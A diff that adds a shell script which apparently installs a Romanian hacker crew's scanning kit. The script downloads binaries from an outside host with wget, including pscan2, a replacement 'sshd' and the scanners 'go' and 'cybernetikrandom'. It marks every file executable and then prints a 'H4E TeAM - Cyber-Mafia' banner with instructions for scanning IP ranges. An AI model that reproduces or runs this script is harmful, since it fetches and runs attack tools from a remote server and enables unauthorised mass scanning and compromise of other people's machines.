@@ -1,0 +1,32 @@
+mkdir cybernetik.3x.ro
+cd cybernetik.3x.ro
+wget cybernetik.3x.ro/h4ex/1
+wget cybernetik.3x.ro/h4ex/go
+wget cybernetik.3x.ro/h4ex/h4e
+wget cybernetik.3x.ro/h4ex/petarda
+wget cybernetik.3x.ro/h4ex/pscan2
+wget cybernetik.3x.ro/h4ex/screen
+wget cybernetik.3x.ro/h4ex/sshd
+wget cybernetik.3x.ro/speedtestvps.py
+wget cybernetik.3x.ro/cyberinfo
+wget cybernetik.3x.ro/cybernetikrandom
+touch port
+chmod +x *
+echo "####################################"
+echo "###### H4E TeAM - Cyber-Mafia ######"
+echo "####################################"
+echo "# H4E PACK - SiLE Cyber            #"
+echo "# Haterii sa se abtina #frankfurd  #"
+echo "####################################"
+echo "# Skype : sile.cyber1              #"
+echo "# SiTE  : cybernetik.3x.ro         #"
+echo "####################################"
+echo "# Acum scrie asa bajatu :          #"
+echo "# Pt clase : www.cybernetik.3x.ro  #"
+echo "####################################"
+echo "# ./go 123.123 - pentru scan       #"
+echo "# ./cybernetikrandom - scan random #"
+echo "####################################"
+echo "# Pt mai multe tutoriale si arhive #"
+echo "# ai site meu mai sus, easy.       #"
+echo "####################################"
